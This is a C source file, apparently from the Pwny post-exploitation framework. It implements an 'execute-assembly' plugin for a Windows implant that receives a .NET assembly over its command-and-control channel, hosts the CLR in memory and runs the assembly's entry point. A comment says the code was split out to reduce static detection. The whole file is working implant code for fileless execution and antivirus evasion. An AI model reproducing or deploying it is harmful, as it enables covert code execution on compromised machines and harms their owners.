/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Execute Assembly tab plugin — in-memory .NET assembly execution via CLR.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <mscoree.h>
#include <oleauto.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define EXECUTE_ASSEMBLY_BASE 30

#define EXECUTE_ASSEMBLY_RUN \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       EXECUTE_ASSEMBLY_BASE, \
                       API_CALL)

/* ---------- GUIDs -------------------------------------------------------- */

/* CLR v4 hosting */
static const GUID ea_CLSID_CLRMetaHost = {
    0x9280188d, 0x0e8e, 0x4867,
    {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}
};
static const GUID ea_IID_ICLRMetaHost = {
    0xD332DB9E, 0xB9B3, 0x4125,
    {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}
};
static const GUID ea_IID_ICLRRuntimeInfo = {
    0xBD39D1D2, 0xBA2F, 0x486a,
    {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}
};
static const GUID ea_IID_ICLRRuntimeHost = {
    0x90F1A06C, 0x7712, 0x4762,
    {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}
};
/* CLR v2 fallback */
static const GUID ea_CLSID_CorRuntimeHost = {
    0xcb2f6723, 0xab3a, 0x11d2,
    {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}
};
static const GUID ea_IID_ICorRuntimeHost = {
    0xcb2f6722, 0xab3a, 0x11d2,
    {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}
};
/* mscorlib COM interop */
static const GUID ea_IID_AppDomain = {
    0x05F696DC, 0x2B29, 0x3663,
    {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}
};
static const GUID ea_IID_Assembly = {
    0x17156360, 0x2f1a, 0x384a,
    {0xbc, 0x52, 0xfd, 0xe9, 0x3c, 0x21, 0x5c, 0x5b}
};
static const GUID ea_IID_MethodInfo = {
    0xFFCC1B5D, 0xECB8, 0x38DD,
    {0x9B, 0x01, 0x3D, 0xC8, 0xAB, 0xC2, 0xAA, 0x5F}
};

/* ---------- COM vtable definitions (minimal stubs for C) ---------------- */

typedef struct _ICLRMetaHostVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *This, REFIID riid, void **ppv);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void *This);
    ULONG   (STDMETHODCALLTYPE *Release)(void *This);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(void *This, LPCWSTR pwzVersion,
             REFIID riid, void **ppRuntime);
    void *padding[8];
} ICLRMetaHostVtbl;

typedef struct { ICLRMetaHostVtbl *lpVtbl; } ICLRMetaHost;

typedef struct _ICLRRuntimeInfoVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *This, REFIID riid, void **ppv);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void *This);
    ULONG   (STDMETHODCALLTYPE *Release)(void *This);
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(void *This, LPWSTR pBuffer,
             DWORD *pcchBuffer);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(void *This, LPWSTR pBuffer,
             DWORD *pcchBuffer);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(void *This, HANDLE hndProcess, BOOL *pbLoaded);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(void *This, UINT iResourceID,
             LPWSTR pBuffer, DWORD *pcchBuffer, LONG iLocaleID);
    HRESULT (STDMETHODCALLTYPE *LoadLibraryA_)(void *This, LPCWSTR pwzDllName,
             HMODULE *phndModule);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress_)(void *This, LPCSTR pszProcName,
             LPVOID *ppProc);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(void *This, REFCLSID rclsid,
             REFIID riid, void **ppUnk);
    HRESULT (STDMETHODCALLTYPE *IsLoadable)(void *This, BOOL *pbLoadable);
    HRESULT (STDMETHODCALLTYPE *SetDefaultStartupFlags)(void *This, DWORD dwStartupFlags,
             LPCWSTR pwzHostConfigFile);
    HRESULT (STDMETHODCALLTYPE *GetDefaultStartupFlags)(void *This, DWORD *pdwStartupFlags,
             LPWSTR pwzHostConfigFile, DWORD *pcchHostConfigFile);
    HRESULT (STDMETHODCALLTYPE *BindAsLegacyV2Runtime)(void *This);
} ICLRRuntimeInfoVtbl;

typedef struct { ICLRRuntimeInfoVtbl *lpVtbl; } ICLRRuntimeInfo;

typedef struct _AppDomainVtbl
{
    void *slots[45];
    HRESULT (STDMETHODCALLTYPE *Load_3)(void *This, SAFEARRAY *rawAssembly,
             void **ppAssembly);
    void *rest[30];
} AppDomainVtbl;

typedef struct { AppDomainVtbl *lpVtbl; } AppDomain;

typedef struct _AssemblyVtbl
{
    void *slots[17];
    HRESULT (STDMETHODCALLTYPE *get_EntryPoint)(void *This,
             void **ppMethodInfo);
    void *rest[30];
} AssemblyVtbl;

typedef struct { AssemblyVtbl *lpVtbl; } Assembly;

typedef struct _MethodInfoVtbl
{
    void *slots[64];
    HRESULT (STDMETHODCALLTYPE *Invoke_3)(void *This, VARIANT obj,
             SAFEARRAY *parameters, VARIANT *result);
    void *rest[10];
} MethodInfoVtbl;

typedef struct { MethodInfoVtbl *lpVtbl; } MethodInfo;

typedef HRESULT (STDMETHODCALLTYPE *pfnCLRCreateInstance)(
    REFCLSID clsid, REFIID riid, LPVOID *ppInterface);

/* ---------- CLR initialization ------------------------------------------ */

static HRESULT execute_assembly_get_runtime(ICorRuntimeHost **ppCorHost)
{
    HMODULE hMscoree;
    HRESULT hr;

    hMscoree = LoadLibraryA("mscoree.dll");
    if (hMscoree == NULL)
    {
        return E_FAIL;
    }

    /* Try v4+ path */
    {
        pfnCLRCreateInstance pCLRCreateInstance;
        ICLRMetaHost *pMetaHost = NULL;
        ICLRRuntimeInfo *pRuntimeInfo = NULL;

        pCLRCreateInstance = (pfnCLRCreateInstance)GetProcAddress(
            hMscoree, "CLRCreateInstance");

        if (pCLRCreateInstance != NULL)
        {
            hr = pCLRCreateInstance(&ea_CLSID_CLRMetaHost,
                                    &ea_IID_ICLRMetaHost,
                                    (void **)&pMetaHost);
            if (SUCCEEDED(hr) && pMetaHost != NULL)
            {
                hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v4.0.30319",
                         &ea_IID_ICLRRuntimeInfo, (void **)&pRuntimeInfo);

                if (FAILED(hr) || pRuntimeInfo == NULL)
                {
                    hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v2.0.50727",
                             &ea_IID_ICLRRuntimeInfo, (void **)&pRuntimeInfo);
                }

                if (SUCCEEDED(hr) && pRuntimeInfo != NULL)
                {
                    hr = pRuntimeInfo->lpVtbl->GetInterface(
                             pRuntimeInfo,
                             &ea_CLSID_CorRuntimeHost,
                             &ea_IID_ICorRuntimeHost,
                             (void **)ppCorHost);

                    pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
                }

                pMetaHost->lpVtbl->Release(pMetaHost);

                if (SUCCEEDED(hr) && *ppCorHost != NULL)
                {
                    (*ppCorHost)->lpVtbl->Start(*ppCorHost);
                    return S_OK;
                }
            }
        }
    }

    /* Fallback: v2 CorBindToRuntimeEx */
    {
        typedef HRESULT (STDMETHODCALLTYPE *pfnCorBindToRuntimeEx)(
            LPCWSTR, LPCWSTR, DWORD, REFCLSID, REFIID, LPVOID *);
        pfnCorBindToRuntimeEx pCorBind;

        pCorBind = (pfnCorBindToRuntimeEx)GetProcAddress(
            hMscoree, "CorBindToRuntimeEx");

        if (pCorBind != NULL)
        {
            hr = pCorBind(L"v2.0.50727", L"wks", 0,
                          &ea_CLSID_CorRuntimeHost,
                          &ea_IID_ICorRuntimeHost,
                          (void **)ppCorHost);

            if (SUCCEEDED(hr) && *ppCorHost != NULL)
            {
                (*ppCorHost)->lpVtbl->Start(*ppCorHost);
                return S_OK;
            }
        }
    }

    return E_FAIL;
}

/* ---------- SAFEARRAY args builder -------------------------------------- */

static SAFEARRAY *execute_assembly_build_args(const char *argv)
{
    SAFEARRAY *psa;
    SAFEARRAYBOUND bound;
    LONG idx;
    BSTR bstr;
    wchar_t wbuf[4096];
    int wlen;

    if (argv == NULL || *argv == '\0')
    {
        bound.lLbound = 0;
        bound.cElements = 0;
        return SafeArrayCreate(VT_BSTR, 1, &bound);
    }

    wlen = MultiByteToWideChar(CP_UTF8, 0, argv, -1, wbuf, 4096);
    if (wlen <= 0)
    {
        return NULL;
    }

    bound.lLbound = 0;
    bound.cElements = 1;
    psa = SafeArrayCreate(VT_BSTR, 1, &bound);

    if (psa == NULL)
    {
        return NULL;
    }

    bstr = SysAllocString(wbuf);
    idx = 0;
    SafeArrayPutElement(psa, &idx, bstr);
    SysFreeString(bstr);

    return psa;
}

/* ---------- Handler ------------------------------------------------------ */

static tlv_pkt_t *execute_assembly_run(c2_t *c2)
{
    int asm_size;
    unsigned char *asm_data = NULL;
    char *args_str = NULL;

    ICorRuntimeHost *pCorHost = NULL;
    IUnknown *pUnkDomain = NULL;
    AppDomain *pAppDomain = NULL;
    Assembly *pAssembly = NULL;
    MethodInfo *pEntryPoint = NULL;

    SAFEARRAY *psaImage = NULL;
    SAFEARRAY *psaArgs = NULL;
    SAFEARRAYBOUND bound;
    void *pData;

    VARIANT vEmpty;
    VARIANT vArgs;
    VARIANT vResult;

    HRESULT hr;

    asm_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &asm_data);
    if (asm_size <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Optional arguments string */
    {
        char buf[8192];
        if (tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, buf) >= 0)
        {
            args_str = _strdup(buf);
        }
    }

    /* Boot the CLR */
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = execute_assembly_get_runtime(&pCorHost);
    if (FAILED(hr) || pCorHost == NULL)
    {
        log_debug("* execute_assembly: failed to initialize CLR (0x%lx)\n",
                  (unsigned long)hr);
        free(asm_data);
        if (args_str) free(args_str);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Get the default AppDomain */

    hr = pCorHost->lpVtbl->GetDefaultDomain(pCorHost, &pUnkDomain);
    if (FAILED(hr) || pUnkDomain == NULL)
    {
        log_debug("* execute_assembly: GetDefaultDomain failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    hr = pUnkDomain->lpVtbl->QueryInterface(pUnkDomain,
             &ea_IID_AppDomain, (void **)&pAppDomain);
    pUnkDomain->lpVtbl->Release(pUnkDomain);

    if (FAILED(hr) || pAppDomain == NULL)
    {
        log_debug("* execute_assembly: QI for _AppDomain failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* Wrap the assembly bytes in a SAFEARRAY(VT_UI1) */

    bound.lLbound = 0;
    bound.cElements = (ULONG)asm_size;
    psaImage = SafeArrayCreate(VT_UI1, 1, &bound);

    if (psaImage == NULL)
    {
        log_debug("* execute_assembly: SafeArrayCreate failed\n");
        goto fail;
    }

    hr = SafeArrayAccessData(psaImage, &pData);
    if (FAILED(hr))
    {
        goto fail;
    }

    memcpy(pData, asm_data, asm_size);
    SafeArrayUnaccessData(psaImage);
    free(asm_data);
    asm_data = NULL;

    /* Load the assembly */

    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, psaImage,
             (void **)&pAssembly);
    SafeArrayDestroy(psaImage);
    psaImage = NULL;

    if (FAILED(hr) || pAssembly == NULL)
    {
        log_debug("* execute_assembly: Load_3 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* Get the entry point */

    hr = pAssembly->lpVtbl->get_EntryPoint(pAssembly,
             (void **)&pEntryPoint);
    if (FAILED(hr) || pEntryPoint == NULL)
    {
        log_debug("* execute_assembly: get_EntryPoint failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    /* Build the args array */

    psaArgs = execute_assembly_build_args(args_str);
    if (args_str)
    {
        free(args_str);
        args_str = NULL;
    }

    /* Invoke: MethodInfo.Invoke(null, new object[] { args }) */

    VariantInit(&vEmpty);
    VariantInit(&vArgs);
    VariantInit(&vResult);

    if (psaArgs != NULL && psaArgs->rgsabound[0].cElements > 0)
    {
        SAFEARRAY *psaOuter;
        SAFEARRAYBOUND outer_bound;

        outer_bound.lLbound = 0;
        outer_bound.cElements = 1;
        psaOuter = SafeArrayCreate(VT_VARIANT, 1, &outer_bound);

        if (psaOuter != NULL)
        {
            VARIANT vInner;
            LONG idx = 0;

            VariantInit(&vInner);
            V_VT(&vInner) = VT_ARRAY | VT_BSTR;
            V_ARRAY(&vInner) = psaArgs;

            SafeArrayPutElement(psaOuter, &idx, &vInner);

            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, psaOuter, &vResult);

            SafeArrayDestroy(psaOuter);
        }
        else
        {
            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, NULL, &vResult);
        }
    }
    else
    {
        SAFEARRAY *psaOuter;
        SAFEARRAYBOUND outer_bound;
        VARIANT vInner;
        LONG idx = 0;

        outer_bound.lLbound = 0;
        outer_bound.cElements = 1;
        psaOuter = SafeArrayCreate(VT_VARIANT, 1, &outer_bound);

        if (psaOuter != NULL)
        {
            VariantInit(&vInner);
            V_VT(&vInner) = VT_ARRAY | VT_BSTR;

            SAFEARRAYBOUND empty_bound;
            empty_bound.lLbound = 0;
            empty_bound.cElements = 0;
            V_ARRAY(&vInner) = SafeArrayCreate(VT_BSTR, 1, &empty_bound);

            SafeArrayPutElement(psaOuter, &idx, &vInner);

            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, psaOuter, &vResult);

            SafeArrayDestroy(psaOuter);
        }
        else
        {
            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, NULL, &vResult);
        }
    }

    if (psaArgs)
    {
        SafeArrayDestroy(psaArgs);
    }

    VariantClear(&vResult);

    if (FAILED(hr))
    {
        log_debug("* execute_assembly: Invoke_3 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto fail;
    }

    log_debug("* execute_assembly: invocation succeeded\n");

    if (pEntryPoint) ((IUnknown *)(void *)pEntryPoint)->lpVtbl->Release((IUnknown *)(void *)pEntryPoint);
    if (pAssembly) ((IUnknown *)(void *)pAssembly)->lpVtbl->Release((IUnknown *)(void *)pAssembly);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release((IUnknown *)(void *)pAppDomain);
    pCorHost->lpVtbl->Stop(pCorHost);
    pCorHost->lpVtbl->Release(pCorHost);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

fail:
    if (asm_data) free(asm_data);
    if (args_str) free(args_str);
    if (psaImage) SafeArrayDestroy(psaImage);
    if (pEntryPoint) ((IUnknown *)(void *)pEntryPoint)->lpVtbl->Release((IUnknown *)(void *)pEntryPoint);
    if (pAssembly) ((IUnknown *)(void *)pAssembly)->lpVtbl->Release((IUnknown *)(void *)pAssembly);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release((IUnknown *)(void *)pAppDomain);
    if (pCorHost)
    {
        pCorHost->lpVtbl->Stop(pCorHost);
        pCorHost->lpVtbl->Release(pCorHost);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, EXECUTE_ASSEMBLY_RUN, (api_t)execute_assembly_run);
}

#endif
